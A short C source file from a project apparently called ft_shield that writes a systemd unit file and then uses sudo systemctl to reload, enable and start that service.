#include "ft_shield.h"

//systemctl

void	create_service(void)
{
	ft_dprintf(2, "creating service\n");
	int	fd_config = open(DEST_SERVICE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd_config == -1) {
		ft_perror(DEST_SERVICE);
		exit(1);
	}
	int ret_write = write(fd_config, SERVICE, sizeof(SERVICE));
	if (ret_write == -1 || ret_write != sizeof(SERVICE)) {
		ft_perror("service");
	}
	close(fd_config);
}

void	start_service(void)
{
	ft_dprintf(2, "starting service\n");
	system("sudo systemctl daemon-reload");
	system("sudo systemctl enable ft_shield.service");
	system("sudo systemctl start ft_shield.service");
}
